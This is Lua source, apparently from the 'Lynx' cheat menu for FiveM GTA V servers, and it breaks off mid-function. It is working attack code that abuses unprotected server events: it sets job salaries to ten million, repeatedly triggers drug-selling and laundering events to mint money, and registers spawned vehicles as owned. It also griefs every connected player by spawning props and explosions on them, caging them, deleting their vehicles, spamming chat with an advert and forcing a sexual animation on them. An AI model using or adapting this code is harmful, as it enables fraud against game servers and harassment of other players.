local cp = "WeaponTypeSelection"
local cq = "WeaponTypes"
local
function cr(K, x, y) SetTextFont(0) SetTextProportional(1) SetTextScale(0.0, 0.4) SetTextDropshadow(1, 0, 0, 0, 255) SetTextEdge(1, 0, 0, 0, 255) SetTextDropShadow() SetTextOutline() SetTextEntry("STRING") AddTextComponentString(K) DrawText(x, y) end;

function RequestModelSync(cs) local ct = GetHashKey(cs) RequestModel(ct) while not HasModelLoaded(ct) do RequestModel(ct) Citizen.Wait(0) end end;

    function EconomyDy2() if ESX then ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'police', 0, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'mecano', 0, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'ambulance', 0, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'realestateagent', 0, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'cardealer', 0, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'police', 1, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'mecano', 1, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'ambulance', 1, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'realestateagent', 1, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'cardealer', 1, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'police', 2, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'mecano', 2, 10000000) TriggerServerEvent("adminmenu:setsalary") ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'ambulance', 2, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'realestateagent', 2, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'cardealer', 2, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'police', 3, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'mecano', 3, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'ambulance', 3, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'realestateagent', 3, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'cardealer', 3, 10000000) end end;
local
function cu() if v ~= nil then e.OpenMenu(bM)
else aM("~h~Read #lynx-announcements on Lynx Official Discord") end end;
local
function cv() local cw = 300;
local cx = 0;
for M = 0, 128 do
    if NetworkIsPlayerActive(M) and GetPlayerPed(M)  ~= GetPlayerPed(-1) then x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true)) x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(M), true)) distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true)) if distance > cw then local cy = GetEntityCoords(GetPlayerPed(M)) local cz = {
    0x9CF21E0F, 0x34315488, 0x6A27FEB1, 0xCB2ACC8, 0xC6899CDE, 0xD14B5BA3, 0xD9F4474C, 0x32A9996C, 0x69D4F974, 0xCAFC1EC3, 0x79B41171, 0x1075651, 0xC07792D4, 0x781E451D, 0x762657C6, 0xC2E75A21, 0xC3C00861, 0x81FB3FF0, 0x45EF7804, 0xE65EC0E4, 0xE764D794, 0xFBF7D21F, 0xE1AEB708, 0xA5E3D471, 0xD971BBAE, 0xCF7A9A9D, 0xC2CC99D8, 0x8FB233A4, 0x24E08E1F, 0x337B2B54, 0xB9402F87, 0x4F2526DA
}
for i = 1, #cz do local a = CreateObject(cz[i], x2, y2, z2, true, true, true) end
    else aM("~h~You are ~r~too close ~s~from nearest player!", true) end end end end;
    local
function cA() for i = 0, 128 do
    if IsPedInAnyVehicle(GetPlayerPed(i), true) then local cB = "xs_prop_hamburgher_wl"
local cC = GetHashKey(cB) while not HasModelLoaded(cC) do Citizen.Wait(0) RequestModel(cC) end;
    local cD = CreateObject(cC, 0, 0, 0, true, true, true) AttachEntityToEntity(cD, GetVehiclePedIsIn(GetPlayerPed(i), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
else local cB = "xs_prop_hamburgher_wl"
local cC = GetHashKey(cB) while not HasModelLoaded(cC) do Citizen.Wait(0) RequestModel(cC) end;
    local cD = CreateObject(cC, 0, 0, 0, true, true, true) AttachEntityToEntity(cD, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true) end end end;
local
function cE() for i = 0, 128 do local cF = GetPlayerPed(i) hecx, hecy, hecz = table.unpack(GetEntityCoords(cF)) RequestWeaponAsset(0xB1CA77B1, 31, 0) if IsPedInAnyVehicle(cF) then heccx, heccy, heccz = table.unpack(GetEntityCoords(GetVehiclePedIsUsing(cF))) ShootSingleBulletBetweenCoords(heccx, heccy, heccz + 10.0, heccx, heccy, heccz + 1.0, 1, 0, 0xB1CA77B1, cF, 1, 0, 0)
else ShootSingleBulletBetweenCoords(hecx, hecy, hecz + 10.0, hecx, hecy, hecz + 1.0, 1, 0, 0xB1CA77B1, cF, 1, 0, 0) end end end;
local
function cG() for i = 0, 255 do x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i))) roundx = tonumber(string.format("%.2f", x)) roundy = tonumber(string.format("%.2f", y)) roundz = tonumber(string.format("%.2f", z)) while not HasModelLoaded(GetHashKey("prop_fnclink_05crnr1")) do Citizen.Wait(0) RequestModel(GetHashKey("prop_fnclink_05crnr1")) end;
        local cH = CreateObject(GetHashKey("prop_fnclink_05crnr1"), roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false) local cI = CreateObject(GetHashKey("prop_fnclink_05crnr1"), roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false) SetEntityHeading(cH, -90.0) SetEntityHeading(cI, 90.0) FreezeEntityPosition(cH, true) FreezeEntityPosition(cI, true) end end;

    function bananapartyall() Citizen.CreateThread(function() for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", "^1L^2y^3n^4x ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n", {
                141, 211, 255
            }, "^"..av..
            "lynxmenu.com - Cheats and Anti-Lynx") end;
        for i = 0, 128 do local d = CreateObject(-1207431159, 0, 0, 0, true, true, true) local cJ = CreateObject(GetHashKey("cargoplane"), 0, 0, 0, true, true, true) local cK = CreateObject(GetHashKey("prop_beach_fire"), 0, 0, 0, true, true, true) AttachEntityToEntity(d, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) AttachEntityToEntity(cJ, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) AttachEntityToEntity(cK, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) end end) end;
local
function cL(ped, cM, cN) SetEntityCoordsNoOffset(ped, cM.x, cM.y, cM.z, false, false, false, true) NetworkResurrectLocalPlayer(cM.x, cM.y, cM.z, cN, true, false) SetPlayerInvincible(ped, false) TriggerEvent('playerSpawned', cM.x, cM.y, cM.z) ClearPedBloodDamage(ped) end;

function RapeAllFunc() for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", "^1L^2y^3n^4x ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n", {
            141, 211, 255
        }, "^"..av..
        "lynxmenu.com - Cheats and Anti-Lynx") end;
    Citizen.CreateThread(function() for i = 0, 128 do RequestModelSync("a_m_o_acult_01") RequestAnimDict("rcmpaparazzo_2") while not HasAnimDictLoaded("rcmpaparazzo_2") do Citizen.Wait(0) end;
            if IsPedInAnyVehicle(GetPlayerPed(i), true)
        then local veh = GetVehiclePedIsIn(GetPlayerPed(i), true) while not NetworkHasControlOfEntity(veh) do NetworkRequestControlOfEntity(veh) Citizen.Wait(0) end;
        SetEntityAsMissionEntity(veh, true, true) DeleteVehicle(veh) DeleteEntity(veh) end; count = -0.2;
        for b = 1, 3 do local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i), true)) local cO = CreatePed(4, GetHashKey("a_m_o_acult_01"), x, y, z, 0.0, true, false) SetEntityAsMissionEntity(cO, true, true) AttachEntityToEntity(cO, GetPlayerPed(i), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true) ClearPedTasks(GetPlayerPed(i)) TaskPlayAnim(GetPlayerPed(i), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0) SetPedKeepTask(cO) TaskPlayAnim(cO, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0) SetEntityInvincible(cO, true) count = count - 0.4 end end end) end;
local
function cP() local cQ = KeyboardInput("Enter X pos", "", 100) local cR = KeyboardInput("Enter Y pos", "", 100) local cS = KeyboardInput("Enter Z pos", "", 100) if cQ ~= ""
and cR ~= ""
and cS ~= ""
then
if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1) then entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
else entity = GetPlayerPed(-1) end;
if entity then SetEntityCoords(entity, cQ + 0.5, cR + 0.5, cS + 0.5, 1, 0, 0, 1) aM("~g~Teleported to coords!", false) end
else aM("~b~Invalid coords!", true) end end;
local
function cT() local aD = KeyboardInput("Enter Blip Name", "", 100) if aD == ""
then aM("~b~Invalid Blip Name!", true) return cT()
else local cQ = KeyboardInput("Enter X pos", "", 100) local cR = KeyboardInput("Enter Y pos", "", 100) local cS = KeyboardInput("Enter Z pos", "", 100) if cQ ~= ""
and cR ~= ""
and cS ~= ""
then local cU = {
    {
        colour = 75, id = 84
    }
}
for _, cV in pairs(cU) do cV.blip = AddBlipForCoord(cQ + 0.5, cR + 0.5, cS + 0.5) SetBlipSprite(cV.blip, cV.id) SetBlipDisplay(cV.blip, 4) SetBlipScale(cV.blip, 0.9) SetBlipColour(cV.blip, cV.colour) SetBlipAsShortRange(cV.blip, true) BeginTextCommandSetBlipName("STRING") AddTextComponentString(aD) EndTextCommandSetBlipName(cV.blip) end
    else aM("~b~Invalid coords!", true) end end end;
    local
function cW() local aO = GetPlayerPed(-1) local cX = GetEntityCoords(aO, true) local cY = GetClosestVehicle(GetEntityCoords(aO, true), 1000.0, 0, 4) local cZ = GetEntityCoords(cY, true) local c_ = GetClosestVehicle(GetEntityCoords(aO, true), 1000.0, 0, 16384) local d0 = GetEntityCoords(c_, true) aM("~y~Wait...", false) Citizen.Wait(1000) if cY == 0 and c_ == 0 then aM("~b~No Vehicle Found", true) elseif cY == 0 and c_ ~= 0 then
if IsVehicleSeatFree(c_, -1) then SetPedIntoVehicle(aO, c_, -1) SetVehicleAlarm(c_, false) SetVehicleDoorsLocked(c_, 1) SetVehicleNeedsToBeHotwired(c_, false)
else local d1 = GetPedInVehicleSeat(c_, -1) ClearPedTasksImmediately(d1) SetEntityAsMissionEntity(d1, 1, 1) DeleteEntity(d1) SetPedIntoVehicle(aO, c_, -1) SetVehicleAlarm(c_, false) SetVehicleDoorsLocked(c_, 1) SetVehicleNeedsToBeHotwired(c_, false) end;
aM("~g~Teleported Into Nearest Vehicle!", false) elseif cY ~= 0 and c_ == 0 then
if IsVehicleSeatFree(cY, -1) then SetPedIntoVehicle(aO, cY, -1) SetVehicleAlarm(cY, false) SetVehicleDoorsLocked(cY, 1) SetVehicleNeedsToBeHotwired(cY, false)
else local d1 = GetPedInVehicleSeat(cY, -1) ClearPedTasksImmediately(d1) SetEntityAsMissionEntity(d1, 1, 1) DeleteEntity(d1) SetPedIntoVehicle(aO, cY, -1) SetVehicleAlarm(cY, false) SetVehicleDoorsLocked(cY, 1) SetVehicleNeedsToBeHotwired(cY, false) end;
aM("~g~Teleported Into Nearest Vehicle!", false) elseif cY ~= 0 and c_ ~= 0 then
if Vdist(cZ.x, cZ.y, cZ.z, cX.x, cX.y, cX.z) < Vdist(d0.x, d0.y, d0.z, cX.x, cX.y, cX.z) then
if IsVehicleSeatFree(cY, -1) then SetPedIntoVehicle(aO, cY, -1) SetVehicleAlarm(cY, false) SetVehicleDoorsLocked(cY, 1) SetVehicleNeedsToBeHotwired(cY, false)
else local d1 = GetPedInVehicleSeat(cY, -1) ClearPedTasksImmediately(d1) SetEntityAsMissionEntity(d1, 1, 1) DeleteEntity(d1) SetPedIntoVehicle(aO, cY, -1) SetVehicleAlarm(cY, false) SetVehicleDoorsLocked(cY, 1) SetVehicleNeedsToBeHotwired(cY, false) end elseif Vdist(cZ.x, cZ.y, cZ.z, cX.x, cX.y, cX.z) > Vdist(d0.x, d0.y, d0.z, cX.x, cX.y, cX.z) then
if IsVehicleSeatFree(c_, -1) then SetPedIntoVehicle(aO, c_, -1) SetVehicleAlarm(c_, false) SetVehicleDoorsLocked(c_, 1) SetVehicleNeedsToBeHotwired(c_, false)
else local d1 = GetPedInVehicleSeat(c_, -1) ClearPedTasksImmediately(d1) SetEntityAsMissionEntity(d1, 1, 1) DeleteEntity(d1) SetPedIntoVehicle(aO, c_, -1) SetVehicleAlarm(c_, false) SetVehicleDoorsLocked(c_, 1) SetVehicleNeedsToBeHotwired(c_, false) end end;
aM("~g~Teleported Into Nearest Vehicle!", false) end end;
local
function d2() if DoesBlipExist(GetFirstBlipInfoId(8)) then local d3 = GetBlipInfoIdIterator(8) local blip = GetFirstBlipInfoId(8, d3) WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) wp = true
else aM("~b~No waypoint!", true) end;
local d4 = 0.0;
height = 1000.0;
while wp do Citizen.Wait(0) if wp
then
if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1) then entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
else entity = GetPlayerPed(-1) end;
SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height) FreezeEntityPosition(entity, true) local d5 = GetEntityCoords(entity, true) if d4 == 0.0 then height = height - 25.0;
SetEntityCoords(entity, d5.x, d5.y, height) bool, d4 = GetGroundZFor_3dCoord(d5.x, d5.y, d5.z, 0)
else SetEntityCoords(entity, d5.x, d5.y, d4) FreezeEntityPosition(entity, false) wp = false;
height = 1000.0;
d4 = 0.0;
aM("~g~Teleported to waypoint!", false) break end end end end;
local
function d6() local d7 = KeyboardInput("Enter Vehicle Spawn Name", "", 100) if d7 and IsModelValid(d7) and IsModelAVehicle(d7) then RequestModel(d7) while not HasModelLoaded(d7) do Citizen.Wait(0) end;
    local veh = CreateVehicle(GetHashKey(d7), GetEntityCoords(PlayerPedId(-1)), GetEntityHeading(PlayerPedId(-1)), true, true) SetPedIntoVehicle(PlayerPedId(-1), veh, -1)
else aM("~b~~h~Model is not valid!", true) end end;
local
function d8() SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false)) SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0) SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false) Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) SetVehicleUndriveable(vehicle, false) end;
local
function d9() SetVehicleEngineHealth(vehicle, 1000) Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) SetVehicleUndriveable(vehicle, false) end;
local
function da() local aO = GetPlayerPed(-1) local aP = GetVehiclePedIsIn(aO, true) local j = KeyboardInput("Enter the plate license you want", "", 100) if j ~= ""
then SetVehicleNumberPlateText(aP, j) end end;

function hweed() TriggerServerEvent("esx_drugs:startHarvestWeed") TriggerServerEvent("esx_drugs:startHarvestWeed") TriggerServerEvent("esx_drugs:startHarvestWeed") TriggerServerEvent("esx_drugs:startHarvestWeed") TriggerServerEvent("esx_drugs:startHarvestWeed") end;

function tweed() TriggerServerEvent("esx_drugs:startTransformWeed") TriggerServerEvent("esx_drugs:startTransformWeed") TriggerServerEvent("esx_drugs:startTransformWeed") TriggerServerEvent("esx_drugs:startTransformWeed") TriggerServerEvent("esx_drugs:startTransformWeed") end;

function sweed() TriggerServerEvent("esx_drugs:startSellWeed") TriggerServerEvent("esx_drugs:startSellWeed") TriggerServerEvent("esx_drugs:startSellWeed") TriggerServerEvent("esx_drugs:startSellWeed") TriggerServerEvent("esx_drugs:startSellWeed") end;

function hcoke() TriggerServerEvent("esx_drugs:startHarvestCoke") TriggerServerEvent("esx_drugs:startHarvestCoke") TriggerServerEvent("esx_drugs:startHarvestCoke") TriggerServerEvent("esx_drugs:startHarvestCoke") TriggerServerEvent("esx_drugs:startHarvestCoke") end;

function tcoke() TriggerServerEvent("esx_drugs:startTransformCoke") TriggerServerEvent("esx_drugs:startTransformCoke") TriggerServerEvent("esx_drugs:startTransformCoke") TriggerServerEvent("esx_drugs:startTransformCoke") TriggerServerEvent("esx_drugs:startTransformCoke") end;

function scoke() TriggerServerEvent("esx_drugs:startSellCoke") TriggerServerEvent("esx_drugs:startSellCoke") TriggerServerEvent("esx_drugs:startSellCoke") TriggerServerEvent("esx_drugs:startSellCoke") TriggerServerEvent("esx_drugs:startSellCoke") end;

function hmeth() TriggerServerEvent("esx_drugs:startHarvestMeth") TriggerServerEvent("esx_drugs:startHarvestMeth") TriggerServerEvent("esx_drugs:startHarvestMeth") TriggerServerEvent("esx_drugs:startHarvestMeth") TriggerServerEvent("esx_drugs:startHarvestMeth") end;

function tmeth() TriggerServerEvent("esx_drugs:startTransformMeth") TriggerServerEvent("esx_drugs:startTransformMeth") TriggerServerEvent("esx_drugs:startTransformMeth") TriggerServerEvent("esx_drugs:startTransformMeth") TriggerServerEvent("esx_drugs:startTransformMeth") end;

function smeth() TriggerServerEvent("esx_drugs:startSellMeth") TriggerServerEvent("esx_drugs:startSellMeth") TriggerServerEvent("esx_drugs:startSellMeth") TriggerServerEvent("esx_drugs:startSellMeth") TriggerServerEvent("esx_drugs:startSellMeth") end;

function hopi() TriggerServerEvent("esx_drugs:startHarvestOpium") TriggerServerEvent("esx_drugs:startHarvestOpium") TriggerServerEvent("esx_drugs:startHarvestOpium") TriggerServerEvent("esx_drugs:startHarvestOpium") TriggerServerEvent("esx_drugs:startHarvestOpium") end;

function topi() TriggerServerEvent("esx_drugs:startTransformOpium") TriggerServerEvent("esx_drugs:startTransformOpium") TriggerServerEvent("esx_drugs:startTransformOpium") TriggerServerEvent("esx_drugs:startTransformOpium") TriggerServerEvent("esx_drugs:startTransformOpium") end;

function sopi() TriggerServerEvent("esx_drugs:startSellOpium") TriggerServerEvent("esx_drugs:startSellOpium") TriggerServerEvent("esx_drugs:startSellOpium") TriggerServerEvent("esx_drugs:startSellOpium") TriggerServerEvent("esx_drugs:startSellOpium") end;

function mataaspalarufe() TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) end;

function matanumaispalarufe() TriggerServerEvent("esx_drugs:stopHarvestCoke") TriggerServerEvent("esx_drugs:stopTransformCoke") TriggerServerEvent("esx_drugs:stopSellCoke") TriggerServerEvent("esx_drugs:stopHarvestMeth") TriggerServerEvent("esx_drugs:stopTransformMeth") TriggerServerEvent("esx_drugs:stopSellMeth") TriggerServerEvent("esx_drugs:stopHarvestWeed") TriggerServerEvent("esx_drugs:stopTransformWeed") TriggerServerEvent("esx_drugs:stopSellWeed") TriggerServerEvent("esx_drugs:stopHarvestOpium") TriggerServerEvent("esx_drugs:stopTransformOpium") TriggerServerEvent("esx_drugs:stopSellOpium") aM("~b~Everything is now stopped.", false) end;
local
function db() local d7 = KeyboardInput("Enter Vehicle Spawn Name", "", 100) local dc = KeyboardInput("Enter Vehicle Licence Plate", "", 100) if d7 and IsModelValid(d7) and IsModelAVehicle(d7) then RequestModel(d7) while not HasModelLoaded(d7) do Citizen.Wait(0) end;
    local veh = CreateVehicle(GetHashKey(d7), GetEntityCoords(PlayerPedId(-1)), GetEntityHeading(PlayerPedId(-1)), true, true) SetVehicleNumberPlateText(veh, dc) local dd = ESX.Game.GetVehicleProperties(veh) TriggerServerEvent("esx_vehicleshop:setVehicleOwned", dd) aM("~g~~h~Success", false)
else aM("~b~~h~Model is not valid !", true) end end;

function daojosdinpatpemata() local aO = GetPlayerPed(-1) local aP = GetVehiclePedIsIn(aO, true) if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1) then SetVehicleOnGroundProperly(aP) aM("~g~Vehicle Flipped!", false)
else aM("~b~You Aren't In The Driverseat Of A Vehicle!", true) end end;

function stringsplit(de, df) if df == nil then df = "%s"
end;
local dg = {}
i = 1;
for dh in string.gmatch(de, "([^"..df..
        "]+)") do dg[i] = dh;
    i = i + 1 end;
return dg end;
local di = false;

function SpectatePlayer(dj) local aO = PlayerPedId(-1) di = not di;
local dk = GetPlayerPed(dj) if di then local dl, dm, dn = table.unpack(GetEntityCoords(dk, false)) RequestCollisionAtCoord(dl, dm, dn) NetworkSetInSpectatorMode(true, dk) aM("Spectating "..GetPlayerName(dj), false)
else local dl, dm, dn = table.unpack(GetEntityCoords(dk, false)) RequestCollisionAtCoord(dl, dm, dn) NetworkSetInSpectatorMode(false, dk) aM("Stopped Spectating "..GetPlayerName(dj), false) end end;

function ShootPlayer(dj) local head = GetPedBoneCoords(dj, GetEntityBoneIndexByName(dj, "SKEL_HEAD"), 0.0, 0.0, 0.0) SetPedShootsAtCoord(PlayerPedId(-1), head.x, head.y, head.z, true) end;

function MaxOut(veh) SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false) ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true) ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true) ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true) ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true) ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true) ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true) SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false) SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 0, true) SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 1, true) SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 2, true) SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 3, true) SetVehicleNeonLightsColour(GetVehiclePedIsIn(GetPlayerPed(-1)), 222, 222, 255) end;

function DelVeh(veh) SetEntityAsMissionEntity(Object, 1, 1) DeleteEntity(Object) SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1) DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false)) end;

function Clean(veh) SetVehicleDirtLevel(veh, 15.0) end;

function Clean2(veh) SetVehicleDirtLevel(veh, 1.0) end;

function RequestControl(entity) local dp = 0;
NetworkRequestControlOfEntity(entity) while not NetworkHasControlOfEntity(entity) do dp = dp + 100;
    Citizen.Wait(100) if dp > 5000 then aM("Hung for 5 seconds, killing to prevent issues...", true) end end end;

function getEntity(dj) local j, entity = GetEntityPlayerIsFreeAimingAt(dj, Citizen.ReturnResultAnyway()) return entity end;

function GetInputMode() return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard"
or "GamePad"
end;

function DrawSpecialText(dq, dr) SetTextEntry_2("STRING") AddTextComponentString(dq) DrawSubtitleTimed(dr, 1) end;
local ds = true;
local dt = false;
local du = true;
local dv = true;
Citizen.CreateThread(function() while true do Wait(1) for M = 0, 128 do
        if NetworkIsPlayerActive(M)
